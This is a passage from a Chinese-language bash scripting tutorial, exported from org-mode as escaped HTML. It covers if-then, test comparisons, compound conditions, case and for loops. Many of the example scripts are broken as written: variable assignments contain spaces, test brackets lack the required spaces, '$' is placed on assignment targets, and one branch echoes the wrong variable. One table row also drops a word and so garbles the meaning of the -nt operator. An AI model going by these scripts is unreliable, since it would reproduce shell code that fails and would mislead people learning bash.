&lt;li&gt;awk&lt;/li&gt;
&lt;li&gt;sort&lt;/li&gt;
&lt;li&gt;wc&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgfe61a7c&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgfe61a7c&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.3.3&lt;/span&gt; 结构化命令&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-3-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
if-then
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgd734f06&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;testuser&lt;/span&gt; = zrg
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; grep $&lt;span style=&quot;color: #FF8C00;&quot;&gt;testuser&lt;/span&gt; /etc/passwd
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The bash files for user $testuser are:&quot;&lt;/span&gt;
    ls -a /home/$&lt;span style=&quot;color: #FF8C00;&quot;&gt;testuser&lt;/span&gt;/.b*
    &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;elif&lt;/span&gt; ls -d /home/$&lt;span style=&quot;color: #FF8C00;&quot;&gt;testuser&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The user $testuser has a directory&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;else&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The user $testuser does not exist on this system.&quot;&lt;/span&gt;
    &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;

&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;test&amp;#21629;&amp;#20196;&amp;#25552;&amp;#20379;&amp;#20102;&amp;#22312;if-then&amp;#35821;&amp;#21477;&amp;#20013;&amp;#27979;&amp;#35797;&amp;#19981;&amp;#21516;&amp;#26465;&amp;#20214;&amp;#30340;&amp;#36884;&amp;#24452;&amp;#12290;&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;test&amp;#21629;&amp;#20196;&amp;#21487;&amp;#20197;&amp;#21028;&amp;#26029;&amp;#19977;&amp;#31867;&amp;#26465;&amp;#20214;&amp;#65306;&amp;#25968;&amp;#20540;&amp;#27604;&amp;#36739;&amp;#65307;&amp;#23383;&amp;#31526;&amp;#20018;&amp;#27604;&amp;#36739;&amp;#65307;&amp;#25991;&amp;#20214;&amp;#27604;&amp;#36739;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;a id=&quot;org83e509a&quot;&gt;&lt;/a&gt;test 命令&lt;br /&gt;
&lt;div class=&quot;outline-text-6&quot; id=&quot;text-4-3-3-0-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
格式：

&lt;/pre&gt;
&lt;p&gt;
if test condition
then
commands
fi
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
如果 test 命令中列出的条件成立，退出并返回退出状态码0；如果条件不成立，退出并返回非零的退出状态码。

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgde371b4&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var&lt;/span&gt; = 10
&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var&lt;/span&gt; -eq 5]
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt; 
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The value $var are equal.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;else&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The value $var are different.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; = baduser
&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [$&lt;span style=&quot;color: #FF8C00;&quot;&gt;USER&lt;/span&gt; != $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;]
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;This is not $var1&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;else&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Welcome $var&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var2&lt;/span&gt; = baseall
$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var3&lt;/span&gt; = hockey
&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var2&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;\&amp;gt;&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var3&lt;/span&gt;] &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;gt;&amp;#31526;&amp;#21495;&amp;#38656;&amp;#35201;&amp;#36716;&amp;#20041;&amp;#65292;&amp;#38450;&amp;#27490;&amp;#35299;&amp;#37322;&amp;#25104;&amp;#36755;&amp;#20986;&amp;#37325;&amp;#23450;&amp;#21521;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$var2 is greater than $var3&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;else&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$var2 is less than $var3&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
特别说明：
1.test命令和测试表达式使用标准的数学比较符号来表示字符串比较，而用文本代码来表示数值比较。
2.比较测试时，大写字母被认为是小于小写字母，但sort命令恰好相反。

&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgedc5b5b&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; = testing
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var2&lt;/span&gt; =&lt;span style=&quot;color: #CDC673;&quot;&gt;''&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [-n $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;]
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The string '$var1' is not empty.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;else&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The string '$var1' is empty.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [-z $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var2&lt;/span&gt;]
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The string '$var2' is empty.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;else&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The string '$var2' is not empty.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgde19adb&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;jump_directory&lt;/span&gt;=/home/arthur
&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [-d $&lt;span style=&quot;color: #FF8C00;&quot;&gt;jump_directory&lt;/span&gt;]
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The $jump_directory directory exists.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;else&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The $jump_directory directory does not exists.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;比较&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-d file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否存在并是一个目录&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-e file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否存在&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-f file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否存在并是一个文件&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-r file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否存在并可读&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-s file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否存在并非空&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-w file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否存在并可写&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-x file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否存在并可执行&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-O file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否存在并属当前用户所有&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-G file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否存在并且默认组与当前用户相同&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;file1 -nt file2&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否比file2&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;file1 -ot file2&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检查file是否比file2旧&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;org5d68210&quot;&gt;&lt;/a&gt;复合条件&lt;br /&gt;
&lt;div class=&quot;outline-text-6&quot; id=&quot;text-4-3-3-0-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
格式：

&lt;/pre&gt;
&lt;p&gt;
[condition1] &amp;amp;&amp;amp; [condition2]
[condition1] || [condition2]
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org262350a&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;testing compound comparisons&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [-d $&lt;span style=&quot;color: #FF8C00;&quot;&gt;HOME&lt;/span&gt;] &amp;amp;&amp;amp; [-w $&lt;span style=&quot;color: #FF8C00;&quot;&gt;HOME&lt;/span&gt;/testing]
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The file exists and you can write to it.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;else&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;I cannot write to the file.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;org6e13e83&quot;&gt;&lt;/a&gt;if-then 的高级特性&lt;br /&gt;
&lt;div class=&quot;outline-text-6&quot; id=&quot;text-4-3-3-0-3&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org0e25ad7&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;(( expression )) expression &amp;#21487;&amp;#20197;&amp;#26159;&amp;#20219;&amp;#24847;&amp;#30340;&amp;#25968;&amp;#23398;&amp;#36171;&amp;#20540;&amp;#25110;&amp;#27604;&amp;#36739;&amp;#34920;&amp;#36798;&amp;#24335;&amp;#12290;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;=10
&lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt;(( $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; ** 2 &amp;gt; 90))
&lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
        (( $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var2&lt;/span&gt; = $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; ** 2))
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The square of $var1 is $var2.&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orga5d0691&quot;&gt;  &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/bash&lt;/span&gt;
  &lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;[[ expression ]]&lt;/span&gt;
  &lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt;[[ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;USER&lt;/span&gt; == r* ]]
  &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
          &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Hello $USER&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;else&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Sorry, I do not know you.&quot;&lt;/span&gt;
  &lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
case 命令
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
格式：

&lt;/pre&gt;
&lt;p&gt;
case $变量名 in
模式1)
命令序列1;;
模式2)
命令序列2;;
*)
默认执行的命令序列;;
esac 
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org3af3595&quot;&gt;  &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/bash&lt;/span&gt;
  &lt;span style=&quot;color: #FF1493;&quot;&gt;case&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;action&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt;
        start | begin)
                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;start something&quot;&lt;/span&gt;
                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;begin something&quot;&lt;/span&gt;;;
        stop | end)
                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;stop something&quot;&lt;/span&gt;
                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;end something&quot;&lt;/span&gt;;;
        *)
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Ignorant.&quot;&lt;/span&gt;;;
&lt;span style=&quot;color: #FF1493;&quot;&gt;esac&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
for 命令
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
格式：

&lt;/pre&gt;
&lt;p&gt;
for var in list
do
commands
done
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgfe5d354&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;basic for command&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; country&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; China America India Japen
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The next state is $country&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;

&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;another example of how not to use the for command&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;1.&amp;#20351;&amp;#29992;&amp;#36716;&amp;#20041;&amp;#23383;&amp;#31526;&amp;#65288;&amp;#21453;&amp;#26012;&amp;#32447;&amp;#65289;&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;2.&amp;#20351;&amp;#29992;&amp;#21452;&amp;#24341;&amp;#21495;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; test&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; I don&lt;span style=&quot;color: #CDC673;&quot;&gt;\'&lt;/span&gt;t know if &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;this'll&quot;&lt;/span&gt; work
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;word:$test&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;

&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;using a variable to hold the list&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;list&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;China America India Japen&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;list&lt;/span&gt;=$&lt;span style=&quot;color: #FF8C00;&quot;&gt;list&lt;/span&gt;&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot; Connecticut&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; country&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;list&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Welcome to $country&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;

&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;reading values from a file&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;file&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;states&quot;&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#20462;&amp;#25913;IFS&amp;#29615;&amp;#22659;&amp;#21464;&amp;#37327;&amp;#30340;&amp;#20540;&amp;#65292;&amp;#20351;&amp;#20854;&amp;#21482;&amp;#33021;&amp;#35782;&amp;#21035;&amp;#25442;&amp;#34892;&amp;#31526;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;IFS&lt;/span&gt;=$&lt;span style=&quot;color: #CDC673;&quot;&gt;'\n'&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; state&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; $(cat $&lt;span style=&quot;color: #FF8C00;&quot;&gt;file&lt;/span&gt;)
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Visit beautiful $state&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;

&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;iterate through all the files in a directory&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; file&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;HOME&lt;/span&gt;/* /etc/nginx/*
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [-d &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$file&quot;&lt;/span&gt;]
        &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$file is a directory.&quot;&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;elif&lt;/span&gt; [-f &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$file&quot;&lt;/span&gt;]
        &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$file is a file.&quot;&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;

&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;C-style for loop&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; (( &lt;span style=&quot;color: #FF8C00;&quot;&gt;i&lt;/span&gt;=1; i &amp;lt;= 10; i++))
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
